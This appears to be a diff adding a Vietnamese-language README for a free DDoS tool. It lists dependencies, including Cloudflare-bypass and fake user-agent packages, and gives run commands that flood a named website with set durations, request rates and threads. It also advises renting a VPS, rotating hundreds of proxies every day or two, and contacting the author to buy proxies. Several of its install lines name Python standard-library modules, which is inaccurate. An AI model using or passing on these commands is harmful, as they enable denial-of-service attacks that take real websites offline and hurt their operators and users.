@@ -1,0 +1,32 @@
+CÀI THƯ VIỆN PYTHON:
+pip install argparse
+pip install subprocess
+pip install time
+pip install requests
+pip install colorama
+pip install random
+pip install datetime
+pip install threading
+======================
+CÀI THƯ VIỆN NODE JS:
+npm install user-agents
+npm install fake-useragent
+npm install header-generator
+npm install randomstring
+npm install cloudscraper
+npm install cluster
+======================
+LỆNH CHẠY TOOL:
+python ddos.py https://thanhdieu.com/ 30 60 5
+- Trong Đó 30 Là Thời Gian DDoS | 60 Là Requests/s | 5 Là Thread
+* Cấu hình mạnh thì sài lệnh:
+python ddos.py https://thanhdieu.com/ 90 64 15
+* Điện thoại thì sài lệnh:
+python ddos.py https://thanhdieu.com/ 60 50 4
+TỐT NHẤT NÊN MUA VPS MÀ DDOS - TOOL FREE MADE BY @THANHDIEUTV
+CÁCH 1-2 NGÀY PHẢI THAY PROXY MỚI - YÊU CẦU PROXY DẠNG HTTP/HTTPS ( TRÊN 500 IP PROXY )
+NẾU MUỐN MUA PROXY INBOX ZALO/FACEBOOK BÊN DƯỚI
+======================
+* Facebook: https://facebook.com/WusThanhDieu
+* Zalo: zalo.me/vuongdieu2k3
+======================
